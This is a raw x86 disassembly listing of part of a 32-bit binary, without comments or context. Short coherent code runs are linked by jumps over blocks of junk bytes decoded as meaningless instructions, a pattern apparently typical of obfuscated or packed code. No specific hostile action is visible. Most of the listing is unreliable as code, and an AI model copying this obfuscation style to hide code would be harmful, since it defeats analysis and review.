  40d78e:	vpminsw xmm5,xmm3,XMMWORD PTR [edx]
  40d792:	inc    ebp
  40d793:	and    BYTE PTR [edx],ch
  40d795:	xchg   edx,eax
  40d796:	add    DWORD PTR [eax+0x7e3c7ce5],ecx
  40d79c:	sub    ebx,0xffffffda
  40d79f:	test   DWORD PTR [ecx+0x6f],edi
  40d7a2:	(bad)  [edi]
  40d7a4:	dec    eax
  40d7a5:	sbb    al,0x20
  40d7a7:	scas   al,BYTE PTR es:[edi]
  40d7a8:	push   ebx
  40d7a9:	push   eax
  40d7aa:	xlat   BYTE PTR ds:[ebx]
  40d7ab:	(bad)
  40d7af:	fbld   TBYTE PTR [edx+0x2a]
  40d7b2:	or     eax,0xb6e9e0d1
  40d7b7:	jo     0x40d767
  40d7b9:	xor    DWORD PTR [esi],0x6a5ced11
  40d7bf:	shr    BYTE PTR [esi+0x13488c6],1
  40d7c5:	adc    BYTE PTR [ecx-0x22],bl
  40d7c8:	mov    esp,?
  40d7ca:	cmp    dl,dl
  40d7cc:	xor    DWORD PTR [ebx+ecx*8],eax
  40d7cf:	pop    edx
  40d7d0:	jecxz  0x40d842
  40d7d2:	(bad)  
  40d7d3:	adc    al,0x99
  40d7d5:	dec    ecx
  40d7d6:	rcr    BYTE PTR ds:0xa44ae747,0x34
  40d7dd:	adc    BYTE PTR [ecx],0xe5
  40d7e0:	push   ebp
  40d7e1:	jmp    DWORD PTR [esi+0x38]
  40d7e4:	pusha  
  40d7e5:	ffreep st(5)
  40d7e7:	(bad)  
  40d7e8:	push   ds
  40d7e9:	or     ch,BYTE PTR [ebx]
  40d7eb:	cmp    eax,0x3b82b865
  40d7f0:	pusha  
  40d7f1:	dec    ebx
  40d7f2:	xor    ebp,ecx
  40d7f4:	imul   edi,edx,0x7e
  40d7f7:	cld    
  40d7f8:	(bad)  [edx-0x6]
  40d7fb:	fistp  QWORD PTR [esi+eiz*1-0x214646bb]
  40d802:	or     ah,BYTE PTR [ebp-0x32b29549]
  40d808:	pop    esp
  40d809:	inc    esi
  40d80a:	inc    ecx
  40d80b:	mov    ds:0x28c09bdb,eax
  40d810:	jge    0x40d83d
  40d812:	std    
  40d813:	test   eax,0xe6cc8d05
  40d818:	loope  0x40d7c1
  40d81a:	fs inc esp
  40d81c:	and    bh,BYTE PTR [edx+0x53d23363]
  40d822:	jmp    0x40d8fe
  40d827:	push   ss
  40d828:	rcl    ah,1
  40d82a:	data16 (bad) 
  40d82c:	data16 mov dh,0xf0
  40d82f:	arpl   ax,ax
  40d831:	push   es
  40d832:	xchg   ebp,eax
  40d833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d834:	test   DWORD PTR [edi+0x6e],eax
  40d837:	jmp    0x0:0xbf00008f
  40d83e:	add    dh,dl
  40d840:	inc    eax
  40d841:	xlat   BYTE PTR ds:[ebx]
  40d842:	in     eax,0x7b
  40d844:	xor    eax,0x69c83603
  40d849:	inc    esp
  40d84a:	mov    esp,0xcc10d048
  40d84f:	jl     0x40d8b9
  40d851:	mov    bl,0x6f
  40d853:	repnz mov ah,BYTE PTR [eax+0x4a]
  40d857:	repz in al,dx
  40d859:	push   0xffffffbc
  40d85b:	(bad)  
  40d85c:	outs   dx,DWORD PTR ds:[esi]
  40d85d:	rcr    dh,cl
  40d85f:	pop    ds
  40d860:	in     al,dx
  40d861:	lods   al,BYTE PTR ds:[esi]
  40d862:	xor    al,cl
  40d864:	fld    QWORD PTR ds:0xc6bd462c
  40d86a:	and    DWORD PTR [edx+0x27],esi
  40d86d:	dec    ecx
  40d86e:	mov    eax,DWORD PTR [esi+0x4]
  40d871:	shl    al,cl
  40d873:	mov    DWORD PTR [esi-0x42],edx
  40d876:	scas   al,BYTE PTR es:[edi]
  40d877:	pop    ebx
  40d878:	and    DWORD PTR [eax],ebx
  40d87a:	test   DWORD PTR [ebx-0x779f582a],esp
  40d880:	xor    ah,bh
  40d882:	scas   al,BYTE PTR es:[edi]
  40d883:	sbb    esp,ebx
  40d885:	mov    ds:0xf6983e17,al
  40d88a:	in     al,0x65
  40d88c:	arpl   WORD PTR [eax-0x7c77d3ef],dx
  40d892:	mov    al,ds:0x57fd7c37
  40d897:	jecxz  0x40d89e
  40d899:	or     DWORD PTR [esi-0x2],edi
  40d89c:	sahf   
  40d89d:	aas    
  40d89e:	mov    dl,0x40
  40d8a0:	push   ebp
  40d8a1:	jmp    0x419b:0x65b48554
  40d8a8:	sbb    al,0xa1
  40d8aa:	or     eax,0xffffff9e
  40d8ad:	fnsave [edi-0x1d]
  40d8b0:	and    al,ch
  40d8b2:	js     0x40d866
  40d8b4:	xchg   ecx,eax
  40d8b5:	cmp    DWORD PTR [eax],0xd5efeaa9
  40d8bb:	ror    DWORD PTR [eax+0x9e0a9e9],cl
  40d8c1:	fdivr  DWORD PTR [edx+0x2093586c]
  40d8c7:	lahf   
  40d8c8:	in     al,0xaa
  40d8ca:	cmp    eax,0x982fb
  40d8cf:	push   es
  40d8d0:	lea    edi,[edx+0x69]
  40d8d3:	stos   BYTE PTR es:[edi],al
  40d8d4:	sbb    BYTE PTR [esi-0x5e3a4cd],al
  40d8da:	int3   
  40d8db:	and    BYTE PTR [eax+0x5f557db2],dh
  40d8e1:	test   DWORD PTR [ebx],ebp
  40d8e3:	xor    dh,BYTE PTR [esi-0x498d38d5]
  40d8e9:	xchg   esi,eax
  40d8ea:	imul   edx,DWORD PTR [ebx],0xb2f4396f
  40d8f0:	es add BYTE PTR cs:[ecx],0xfd
  40d8f5:	and    ah,BYTE PTR [eax+0x7a]
  40d8f8:	push   ebx
  40d8f9:	pop    ss
  40d8fa:	mov    BYTE PTR [ebp+0x15],bh
  40d8fd:	icebp  
  40d8fe:	push   esi
  40d8ff:	push   edi
  40d900:	sub    ecx,eax
  40d902:	mov    DWORD PTR [ebp-0x4],ecx
  40d905:	mov    eax,ds:0x42b03c
  40d90a:	xor    ecx,ecx
  40d90c:	xor    ecx,DWORD PTR ds:0x42c03c
  40d912:	sub    eax,ecx
  40d914:	xor    eax,DWORD PTR [eax+ecx*1]
  40d917:	mov    DWORD PTR [ebp-0x20],0x2a98
  40d91e:	cmp    DWORD PTR ds:0x42f60c,0x0
  40d925:	jg     0x40d93e
  40d92b:	jmp    0x40d93e
  40d930:	push   DWORD PTR [ebp-0x24]
  40d933:	push   0x85d0
  40d938:	call   DWORD PTR ds:0x4387a4
  40d93e:	mov    DWORD PTR [ebp-0x24],0x1
  40d945:	mov    DWORD PTR [ebp-0x28],0x5535
  40d94c:	jmp    0x40da28
  40d951:	popf   
  40d952:	mov    ch,0x2c
  40d954:	xor    al,0x2c
  40d956:	mov    ebp,0xca12bd9d
  40d95b:	ins    DWORD PTR es:[edi],dx
  40d95c:	add    ah,BYTE PTR [eax+0x18]
  40d95f:	xchg   esi,eax
  40d960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d961:	test   eax,0xbf000090
  40d966:	add    BYTE PTR [eax],al
  40d968:	add    BYTE PTR [esi+0x19],dh
  40d96b:	out    0x35,al
  40d96d:	clc    
  40d96e:	cmp    al,0xba
  40d970:	dec    ebx
  40d971:	pop    esi
  40d972:	push   ebx
  40d973:	cmp    BYTE PTR [edi+0x72],cl
  40d976:	xor    ebp,DWORD PTR ds:0xea2f78cc
  40d97c:	mov    al,ds:0x3171e954
  40d981:	add    eax,0x386da3b0
  40d986:	pop    esp
  40d987:	popf   
  40d988:	js     0x40d90a
  40d98a:	(bad)  
  40d98b:	fwait
  40d98c:	shr    DWORD PTR [ebx],0x1a
  40d98f:	add    BYTE PTR [edi+0x26],ah
  40d992:	aas    
  40d993:	leave  
  40d994:	mov    dh,0x83
  40d996:	fwait
  40d997:	not    DWORD PTR [ebx+0x50a0f31d]
  40d99d:	mov    ecx,0x3adb2573
  40d9a2:	outs   dx,DWORD PTR ds:[esi]
  40d9a3:	data16 sti 
  40d9a5:	outs   dx,BYTE PTR ds:[esi]
  40d9a6:	add    al,0x71
  40d9a8:	pop    esp
  40d9a9:	test   DWORD PTR [ecx-0x17],edi
  40d9ac:	(bad)  
  40d9ad:	retf   0xf253
  40d9b0:	dec    edi
  40d9b1:	pop    eax
  40d9b2:	xlat   BYTE PTR ds:[ebx]
  40d9b3:	mov    edx,DWORD PTR [ecx-0x1f]
  40d9b6:	mov    bh,0xb9
  40d9b8:	sbb    edi,DWORD PTR [ebx+ebx*4]
  40d9bb:	retf   
  40d9bc:	mov    eax,ds:0x12546973
  40d9c1:	adc    al,0x97
  40d9c3:	fcomp  QWORD PTR [esi]
  40d9c5:	push   edx
  40d9c6:	xchg   DWORD PTR [ebp+0x418ab504],eax
  40d9cc:	sbb    esi,DWORD PTR [ebx+0x27]
  40d9cf:	mov    ebx,0xa45d4d9c
  40d9d4:	in     al,0xdf
  40d9d6:	dec    ecx
  40d9d7:	fs dec ebp
  40d9d9:	xor    ebx,edx
  40d9db:	(bad)  
  40d9dc:	pop    ebx
  40d9dd:	mov    WORD PTR [esi+0x1171dc40],gs
  40d9e3:	sbb    al,BYTE PTR [esi+0x463ad167]
  40d9e9:	out    0x11,eax
  40d9eb:	xchg   ecx,eax
  40d9ec:	and    eax,0x323d74ca
  40d9f1:	les    ebx,FWORD PTR [eax]
  40d9f3:	push   esp
  40d9f4:	ffreep st(0)
  40d9f6:	cmp    dl,BYTE PTR cs:[ecx+0x1bda299]
  40d9fd:	ds inc eax
  40d9ff:	call   0x267a:0x8cf2af05
  40da06:	push   ds
  40da07:	les    eax,FWORD PTR [eax-0x6]
  40da0a:	iret   
  40da0b:	or     BYTE PTR [ebx-0x2cad5a47],ah
  40da11:	xchg   esi,eax
  40da12:	in     al,dx
  40da13:	rcl    BYTE PTR [edi+0x200def41],1
  40da19:	int    0x39
  40da1b:	mov    ebx,0x39afd952
  40da20:	sbb    ch,dl
  40da22:	cmp    edx,esp
  40da24:	mov    BYTE PTR [eax+0x3a],cl
  40da27:	ins    BYTE PTR es:[edi],dx
  40da28:	mov    eax,DWORD PTR [ebp-0x28]
  40da2b:	mov    ecx,DWORD PTR [ebp-0x24]
  40da2e:	xor    eax,0x4166
  40da33:	div    ecx
  40da35:	mov    ecx,DWORD PTR [ebp-0x20]
  40da38:	mov    edx,DWORD PTR ds:0x42e024
  40da3e:	mov    edx,DWORD PTR [edx]
  40da40:	add    DWORD PTR ds:0x42f598,edx
  40da46:	imul   eax,ecx
  40da49:	mov    edx,DWORD PTR ds:0x42c038
  40da4f:	mov    ecx,DWORD PTR ds:0x42e034
  40da55:	sub    edx,ecx
  40da57:	and    edx,DWORD PTR [edx+ecx*1]
  40da5a:	sub    eax,0x361af48
  40da5f:	mov    ecx,DWORD PTR ds:0x42f588
  40da65:	adc    ecx,DWORD PTR ds:0x42f5f4
  40da6b:	mov    DWORD PTR ds:0x42f588,ecx
  40da71:	jmp    0x40db4d
  40da76:	push   ebp
  40da77:	and    eax,0x97f113b1
  40da7c:	mul    DWORD PTR [edi-0x63]
  40da7f:	aam    0x72
  40da81:	lahf   
  40da82:	loope  0x40dae7
  40da84:	nop
  40da85:	pop    ecx
  40da86:	push   0xbf000091
  40da8b:	add    BYTE PTR [eax],al
  40da8d:	add    BYTE PTR [ebx-0x47a346d7],ah
  40da93:	fcom   QWORD PTR [edi+0x44]
  40da96:	mov    cx,0x845
  40da9a:	imul   edx,DWORD PTR [ebx+ecx*8-0x39],0xffffffe5
  40da9f:	clc    
  40daa0:	stos   DWORD PTR es:[edi],eax
  40daa1:	clc    
  40daa2:	push   eax
  40daa3:	sbb    DWORD PTR [edx+0x2b6b7ce7],ebp
  40daa9:	xchg   edx,eax
  40daaa:	xor    BYTE PTR [edx+0x3c2b0f5b],0xd
  40dab1:	mov    fs,WORD PTR [esi+0x35]
  40dab4:	mov    edx,0xea2690d9
  40dab9:	mov    ds:0x349ccd67,al
  40dabe:	sbb    al,0x8f
  40dac0:	repnz mov cs,esi
  40dac3:	push   es
  40dac4:	and    DWORD PTR [esi+0x271af445],esi
  40daca:	inc    edx
  40dacb:	pop    ds
  40dacc:	inc    edx
  40dacd:	dec    edx
  40dace:	in     eax,0x10
  40dad0:	enter  0xdeb0,0x3d
  40dad4:	or     BYTE PTR [eax+0x11],ah
  40dad7:	mov    ds:0x99879b04,al
  40dadc:	dec    esp
  40dadd:	icebp  
  40dade:	shl    DWORD PTR [eax+0x58],cl
  40dae1:	push   edi
  40dae2:	xchg   edi,eax
  40dae3:	stos   BYTE PTR es:[edi],al
  40dae4:	mov    bl,BYTE PTR [edx+0x46b3ec1a]
  40daea:	mov    edi,0xdb708a39
  40daef:	xor    BYTE PTR [eax+0x69],dh
  40daf2:	adc    eax,0x417329ac
  40daf7:	(bad)  
  40daf9:	test   BYTE PTR [edx],dh
  40dafb:	into   
  40dafc:	test   ch,bl
  40dafe:	jnp    0x40daef
  40db00:	pop    esp
  40db01:	addr16 jmp 0x126e:0xa4d29d75
  40db09:	and    BYTE PTR [eax+0x49],ah
  40db0c:	or     DWORD PTR [edx-0x4f],edx
  40db0f:	lods   eax,DWORD PTR ds:[esi]
  40db10:	cmp    DWORD PTR [edi],edx
  40db12:	sub    al,0x96
  40db14:	in     al,0x7b
  40db16:	loop   0x40dac7
  40db18:	dec    esi
  40db19:	mov    cl,BYTE PTR [ebx-0x1a]
  40db1c:	or     eax,0x51b750e5
  40db21:	jae    0x40db0d
  40db23:	in     al,dx
  40db24:	push   ds
  40db25:	sbb    eax,0x949ad3aa
  40db2a:	jmp    0x40db78
  40db2c:	in     al,dx
  40db2d:	cmp    DWORD PTR [esi],esi
  40db2f:	cmp    BYTE PTR [eax],dl
  40db31:	add    DWORD PTR [eax],0xfffffff2
  40db34:	daa    
  40db35:	pop    edi
  40db36:	in     al,dx
  40db37:	mov    eax,0x8df789a5
  40db3c:	inc    BYTE PTR [eax-0x3]
  40db3f:	jne    0x40dbb8
  40db41:	jl     0x40dae3
  40db43:	lods   al,BYTE PTR ds:[esi]
  40db44:	push   esp
  40db45:	inc    edx
  40db46:	enter  0xfd1f,0x6b
  40db4a:	call   0x45ca71aa
  40db4f:	cld    
  40db50:	mov    DWORD PTR [ebp-0x10],0x4e5b
  40db57:	add    DWORD PTR ds:0x42f5f0,0x58c6
  40db61:	mov    DWORD PTR [ebp-0x1c],0x242
  40db68:	mov    edx,DWORD PTR ds:0x42f54c
  40db6e:	xor    edx,DWORD PTR ds:0x42f598
  40db74:	mov    DWORD PTR ds:0x42f54c,edx
  40db7a:	mov    DWORD PTR [ebp-0x20],0x159f
  40db81:	mov    eax,0x2044
  40db86:	mov    DWORD PTR [ebp-0x24],eax
  40db89:	mov    DWORD PTR [ebp-0x28],0x1f0f
  40db90:	add    DWORD PTR ds:0x42f5d0,ebx
  40db96:	mov    ecx,DWORD PTR [ebp-0x28]
  40db99:	and    DWORD PTR ds:0x42f58c,ecx
  40db9f:	jmp    0x40dc7b
  40dba4:	outs   dx,BYTE PTR ds:[esi]
  40dba5:	jl     0x40dc25
  40dba7:	clc    
  40dba8:	jle    0x40dba4
  40dbaa:	out    dx,al
  40dbab:	(bad)  
  40dbac:	push   ds
  40dbad:	jge    0x40dbb3
  40dbaf:	pop    edi
  40dbb0:	dec    edx
  40dbb1:	ja     0x40dbc1
  40dbb3:	ret    
  40dbb4:	daa    
  40dbb5:	xchg   edx,eax
  40dbb6:	add    BYTE PTR [eax],al
  40dbb8:	mov    edi,0xdc000000
  40dbbd:	add    al,0x84
  40dbbf:	lock repz mov dl,0xbb
  40dbc3:	outs   dx,DWORD PTR ds:[esi]
  40dbc4:	inc    edi
  40dbc5:	lds    ecx,FWORD PTR [edx+0x43]
  40dbc8:	out    dx,al
  40dbc9:	mov    bl,BYTE PTR [esi-0x6f]
  40dbcc:	lds    eax,FWORD PTR [ebp+0x4272bed5]
  40dbd2:	mov    ecx,0x33ff099d
  40dbd7:	repz je 0x40dba8
  40dbda:	ins    DWORD PTR es:[edi],dx
  40dbdb:	jae    0x40dbf1
  40dbdd:	push   esp
  40dbde:	pop    es
  40dbdf:	pop    ecx
  40dbe0:	inc    esp
  40dbe1:	daa    
  40dbe2:	mov    cl,0x9e
  40dbe4:	push   ebp
  40dbe5:	cld    
  40dbe6:	mov    edi,0x66174a46
  40dbeb:	add    DWORD PTR [edx-0x2dc826f],0x7b16b82c
  40dbf5:	in     al,dx
  40dbf6:	pop    eax
  40dbf7:	cmp    al,0x9c
  40dbf9:	dec    eax
  40dbfa:	in     al,dx
  40dbfb:	arpl   WORD PTR [ecx],di
  40dbfd:	pop    es
  40dbfe:	mov    al,0x7f
  40dc00:	xchg   edx,eax
  40dc01:	mov    dl,0x5d
  40dc03:	scas   al,BYTE PTR es:[edi]
  40dc04:	sub    ebp,DWORD PTR [esp+ebx*1+0x10f52e85]
  40dc0b:	mov    dh,0x34
  40dc0d:	ds inc edx
  40dc0f:	repz into 
  40dc11:	push   esi
  40dc12:	dec    esi
  40dc13:	imul   DWORD PTR [esi]
  40dc15:	(bad)  
  40dc16:	bound  edx,QWORD PTR [esi]
  40dc18:	int3   
  40dc19:	cmp    al,0x31
  40dc1b:	and    ecx,esi
  40dc1d:	imul   esi,DWORD PTR [eax-0xb],0x95f4f1da
  40dc24:	retf   
  40dc25:	xor    ebx,DWORD PTR [edx]
  40dc27:	test   eax,0xb79d9fe0
  40dc2c:	adc    eax,DWORD PTR [ebp-0x52]
  40dc2f:	fistp  WORD PTR [eax-0x3b]
  40dc32:	push   esp
  40dc33:	ret    
  40dc34:	xchg   edx,eax
  40dc35:	push   eax
  40dc36:	inc    ecx
  40dc37:	idiv   BYTE PTR ds:0xc5c848d9
  40dc3d:	mov    eax,0xe6575123
  40dc42:	std    
  40dc43:	mov    ebp,0xb212ace
  40dc48:	ds jl  0x40dc36
  40dc4b:	into   
  40dc4c:	adc    BYTE PTR [ecx-0x4e],dl
  40dc4f:	sbb    BYTE PTR [ebx],0xcb
  40dc52:	idiv   ebp
  40dc54:	popf   
  40dc55:	and    eax,0x42e1cead
  40dc5a:	bound  esi,QWORD PTR [edx+0x950af5c]
  40dc60:	mov    ebx,0x788402a1
  40dc65:	ins    BYTE PTR es:[edi],dx
  40dc66:	sub    ecx,DWORD PTR [esi]
  40dc68:	repz loopne 0x40dbf0
  40dc6b:	and    ebx,DWORD PTR [esi-0x56]
  40dc6e:	adc    eax,0x98f77d21
  40dc73:	inc    esp
  40dc74:	rcr    BYTE PTR [ecx-0x62],1
  40dc77:	div    DWORD PTR [ebx+0x558b949a]
  40dc7d:	fadd   QWORD PTR [ecx+0x42f66825]
  40dc83:	add    BYTE PTR [esi+esi*8],al
  40dc86:	inc    edx
  40dc87:	add    BYTE PTR [ecx+0x39c2f1],al
  40dc8d:	add    BYTE PTR [ebx],ah
  40dc8f:	retf   0xc833
  40dc92:	xor    DWORD PTR ds:0x42f5c0,0x5477
  40dc9c:	jmp    0x40dd78
  40dca1:	pop    edx
  40dca2:	xchg   esi,eax
  40dca3:	pop    es
  40dca4:	or     eax,0xd75a9dcf
  40dca9:	inc    esp
  40dcaa:	mov    DWORD PTR [ecx],ecx
  40dcac:	mov    eax,ds:0x337689a5
  40dcb1:	out    0x92,al
  40dcb3:	add    BYTE PTR [eax],al
  40dcb5:	mov    edi,0x95000000
  40dcba:	inc    esp
  40dcbb:	jmp    0x40dcc5
  40dcbd:	sbb    al,0x6c
  40dcbf:	xchg   esp,eax
  40dcc0:	xchg   ecx,eax
  40dcc1:	lods   eax,DWORD PTR ds:[esi]
  40dcc2:	sbb    bh,ah
  40dcc4:	aas    
  40dcc5:	jns    0x40dc9e
  40dcc7:	jnp    0x40dc56
  40dcc9:	outs   dx,BYTE PTR ds:[esi]
  40dcca:	outs   dx,BYTE PTR ds:[esi]
  40dccb:	pop    ss
  40dccc:	cld    
  40dccd:	outs   dx,DWORD PTR ds:[esi]
  40dcce:	enter  0xc2ef,0x22
  40dcd2:	enter  0x6c61,0x55
  40dcd6:	jl     0x40dd43
  40dcd8:	xchg   ebx,eax
  40dcd9:	test   BYTE PTR [ebx-0x15bcc4db],ch
  40dcdf:	leave  
  40dce0:	cmp    ebx,ecx
  40dce2:	push   esi
  40dce3:	data16 xor al,0x40
  40dce6:	add    al,0xdf
  40dce8:	add    eax,0xc1491f70
  40dced:	loopne 0x40dc9f
  40dcef:	call   edi
  40dcf1:	xchg   esi,eax
  40dcf2:	xchg   esi,eax
  40dcf3:	shl    BYTE PTR [esi+0x3a],0xa0
  40dcf7:	cld    
  40dcf8:	(bad)  
  40dcf9:	gs scas eax,DWORD PTR es:[edi]
  40dcfb:	and    al,BYTE PTR [eax+eax*8-0x1f6efe32]
  40dd02:	adc    ebx,DWORD PTR [edi+0x75]
  40dd05:	icebp  
  40dd06:	pusha  
  40dd07:	add    BYTE PTR [ecx],al
  40dd09:	daa    
  40dd0a:	pop    eax
  40dd0b:	popf   
  40dd0c:	je     0x40dcea
  40dd0e:	leave  
  40dd0f:	inc    edi
  40dd10:	xchg   edx,eax
  40dd11:	mov    ds:0x80eebd86,al
  40dd16:	cmc    
  40dd17:	sar    al,cl
  40dd19:	ja     0x40dd13
  40dd1b:	jg     0x40dcd1
  40dd1d:	mov    BYTE PTR [ebp-0x74],bl
  40dd20:	test   al,0x61
  40dd22:	inc    eax
  40dd23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd24:	fmul   QWORD PTR [ebp+0x5c]
  40dd27:	fwait
  40dd28:	out    dx,al
  40dd29:	fild   WORD PTR [ebp-0x43fc1a90]
  40dd2f:	(bad)  
  40dd30:	sub    al,0x40
  40dd32:	pop    edi
  40dd33:	nop
  40dd34:	push   ecx
  40dd35:	push   ds
  40dd36:	jno    0x40dd69
  40dd38:	adc    BYTE PTR [edi+ecx*4+0x1049835c],ah
  40dd3f:	pop    ebx
  40dd40:	mov    ds:0xd1e8247d,eax
  40dd45:	je     0x40dcd6
  40dd47:	mov    ch,0x5f
  40dd49:	mov    ebp,DWORD PTR [ebx-0x77]
  40dd4c:	stos   DWORD PTR es:[edi],eax
  40dd4d:	adc    BYTE PTR [edi],bh
  40dd4f:	mov    WORD PTR [edi-0x7547549],cs
  40dd55:	fsubr  QWORD PTR [edi+0x7d]
  40dd58:	out    0xc4,al
  40dd5a:	add    al,0xb6
  40dd5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd5d:	adc    ebx,DWORD PTR [ebx-0x4f]
  40dd60:	(bad)  
  40dd62:	adc    DWORD PTR [edi],0x7d222da9
  40dd68:	or     dh,bh
  40dd6a:	xchg   BYTE PTR [ebp+0xb],ah
  40dd6d:	mov    eax,ds:0x711d6f90
  40dd72:	dec    edi
  40dd73:	adc    BYTE PTR [edi],dh
  40dd75:	adc    BYTE PTR [ebx-0x1fba745b],cl
  40dd7b:	mov    edx,DWORD PTR ds:0x42f66c
  40dd81:	xor    DWORD PTR ds:0x42f600,edx
  40dd87:	mov    edx,DWORD PTR [ebp-0x1c]
  40dd8a:	sub    DWORD PTR ds:0x42f574,0x6cee
  40dd94:	imul   eax,edx
  40dd97:	cmp    DWORD PTR ds:0x42f55c,0x0
  40dd9e:	ja     0x40de8e
  40dda4:	jmp    0x40de8e
  40dda9:	push   DWORD PTR [ebp-0x1c]
  40ddac:	call   DWORD PTR ds:0x4387ac
  40ddb2:	jmp    0x40de8e
  40ddb7:	pop    eax
  40ddb8:	lds    cx,DWORD PTR [ecx]
  40ddbb:	jmp    FWORD PTR [ebx+0x32bd77dc]
  40ddc1:	sub    dh,BYTE PTR [ebx]
  40ddc3:	dec    ebx
  40ddc4:	mov    edi,0x93a5e4c7
  40ddc9:	add    BYTE PTR [eax],al
  40ddcb:	mov    edi,0xab000000
  40ddd0:	jmp    0x82f4a67a
  40ddd5:	xor    ah,dl
  40ddd7:	fwait
  40ddd8:	test   eax,0xa3873f41
  40dddd:	push   ds
  40ddde:	les    edi,FWORD PTR [ebp-0x78]
  40dde1:	stos   DWORD PTR es:[edi],eax
  40dde2:	out    dx,eax
  40dde3:	inc    eax
  40dde4:	or     dh,BYTE PTR [ecx+0x627bb0fe]
  40ddea:	jl     0x40ddef
  40ddec:	fs fs pusha 
  40ddef:	adc    DWORD PTR [eax],ecx
  40ddf1:	inc    ecx
  40ddf2:	sbb    BYTE PTR [esi+0x42],dl
  40ddf5:	in     al,dx
  40ddf6:	mov    edx,0x34185c3f
  40ddfb:	cdq    
  40ddfc:	jnp    0x40de7d
  40ddfe:	ror    DWORD PTR [edi+0x33],0x15
  40de02:	in     eax,0xde
  40de04:	adc    DWORD PTR [edx+0x6511b185],esi
  40de0a:	outs   dx,DWORD PTR ds:[esi]
  40de0b:	jl     0x40de6a
  40de0d:	(bad)  
  40de0e:	push   0xe34726e1
  40de13:	or     DWORD PTR [edi-0x6b],ebx
  40de16:	or     ebx,DWORD PTR [esi-0x1a65ad7c]
  40de1c:	or     BYTE PTR [eax+0x53a558fa],dl
  40de22:	loopne 0x40de86
  40de24:	lods   al,BYTE PTR ds:[esi]
  40de25:	je     0x40de75
  40de27:	inc    esi
  40de28:	xor    DWORD PTR [eax+0x6],0xffffffed
  40de2c:	fld    QWORD PTR [edi+ecx*4]
  40de2f:	ja     0x40de31
  40de31:	mov    ebp,0xf31488a9
  40de36:	or     ebx,DWORD PTR [ebx+eiz*2+0x69]
  40de3a:	ds lahf 
  40de3c:	push   ds
  40de3d:	add    DWORD PTR [edi-0xff6f017],ebp
  40de43:	ds jno 0x40debe
  40de46:	call   0xffcc:0xb59be63d
  40de4d:	add    DWORD PTR [edx+edi*4-0x22f0e7d5],0xffffff90
  40de55:	stos   BYTE PTR es:[edi],al
  40de56:	push   bx
  40de58:	in     eax,dx
  40de59:	out    0xf1,al
  40de5b:	adc    eax,0x2317013b
  40de60:	je     0x40dde7
  40de62:	push   ebx
  40de63:	sub    al,0xbd
  40de65:	pusha  
  40de66:	mov    bh,0xb0
  40de68:	xor    ebp,DWORD PTR [ecx]
  40de6a:	mov    eax,ds:0xcfe993e2
  40de6f:	clc    
  40de70:	add    dl,BYTE PTR [ecx]
  40de72:	pop    ebx
  40de73:	cmp    BYTE PTR [ebx+0x3e],0x3e
  40de77:	popf   
  40de78:	ds xor eax,edi
  40de7b:	aaa    
  40de7c:	xchg   ebx,eax
  40de7d:	loop   0x40de14
  40de7f:	xor    eax,0x7e23c8ac
  40de84:	outs   dx,BYTE PTR ds:[esi]
  40de85:	repz sub BYTE PTR [ebx+ecx*8-0x1fe59fc0],ah
  40de8d:	jmp    0x110c:0x8b14558b
  40de94:	lea    eax,[ecx+eax*1-0x311f59]
  40de9b:	mov    ecx,DWORD PTR [ebp-0x10]
  40de9e:	add    ecx,eax
  40dea0:	mov    DWORD PTR [ebp-0x8],ecx
  40dea3:	jmp    0x40df7f
  40dea8:	jecxz  0x40de87
  40deaa:	xchg   ecx,eax
  40deab:	hlt    
  40deac:	mov    edi,0xbdfe7fc
  40deb1:	test   DWORD PTR [eax-0x450cac99],ebx
  40deb7:	int    0x64
  40deb9:	xchg   esp,eax
  40deba:	add    BYTE PTR [eax],al
  40debc:	mov    edi,0x2c000000
  40dec1:	lock jmp 0x9c4d:0x1b8b56ce
  40dec9:	xor    al,0x7b
  40decb:	rcr    DWORD PTR [eax+0x79],0xe7
  40decf:	test   BYTE PTR [edi-0x5d9d4179],ah
  40ded5:	out    0xba,eax
  40ded7:	push   0x7f
  40ded9:	in     eax,0x68
  40dedb:	cmp    al,bl
  40dedd:	mov    edx,0xe9b42ef8
  40dee2:	add    eax,0xd1721448
  40dee7:	in     al,0xd7
  40dee9:	or     DWORD PTR [edx-0x429b7e67],0xc1808703
  40def3:	pop    ebp
  40def4:	inc    eax
  40def5:	jbe    0x40df42
  40def7:	out    0xa7,eax
  40def9:	ja     0x40df11
  40defb:	les    esi,FWORD PTR [edi+esi*4]
  40defe:	and    eax,0x46d60db0
  40df03:	mov    WORD PTR [eax-0x76],fs
  40df06:	ficomp DWORD PTR [edi+0x9a5ecb9]
  40df0c:	idiv   bh
  40df0e:	(bad)  
  40df0f:	loop   0x40df11
  40df11:	fsub   DWORD PTR [esi+0x18e367f9]
  40df17:	or     cl,cl
  40df19:	adc    DWORD PTR [edx-0x31],ebx
  40df1c:	lock js 0x40df3c
  40df1f:	(bad)  
  40df21:	scas   eax,DWORD PTR es:[edi]
  40df22:	popa   
  40df23:	ret    0x8315
  40df26:	sub    BYTE PTR [eax+ebp*4],bh
  40df29:	in     al,dx
  40df2a:	pop    ebp
  40df2b:	dec    esp
  40df2c:	xchg   edx,eax
  40df2d:	jle    0x40df04
  40df2f:	sahf   
  40df30:	stc    
  40df31:	int3   
  40df32:	sbb    DWORD PTR [ecx],eax
  40df34:	sub    BYTE PTR [ecx+0x60ee238a],al
  40df3a:	ins    BYTE PTR es:[edi],dx
  40df3b:	lock into 
  40df3d:	lods   eax,DWORD PTR ds:[esi]
  40df3e:	adc    dh,dl
  40df40:	daa    
  40df41:	icebp  
  40df42:	dec    esi
  40df43:	call   0x22c5:0x5362b9e8
  40df4a:	push   ss
  40df4b:	aaa    
  40df4c:	dec    ebp
  40df4d:	out    dx,eax
  40df4e:	or     cl,BYTE PTR [esi]
  40df50:	pand   mm6,QWORD PTR [ecx+esi*1-0x299b10ae]
  40df58:	mov    dh,0xc6
  40df5a:	xchg   edx,eax
  40df5b:	sub    BYTE PTR [edi-0x2f],dh
  40df5e:	mov    ah,0x1d
  40df60:	retf   0xf506
  40df63:	cmp    DWORD PTR [ecx-0x5c],ecx
  40df66:	ret    0xdd3e
  40df69:	inc    ebp
  40df6a:	and    eax,DWORD PTR [ebx+ecx*2+0x5aa176ad]
  40df71:	dec    edi
  40df72:	or     eax,0x648dc731
  40df77:	retf   
  40df78:	and    bh,BYTE PTR [edi-0x579d09f9]
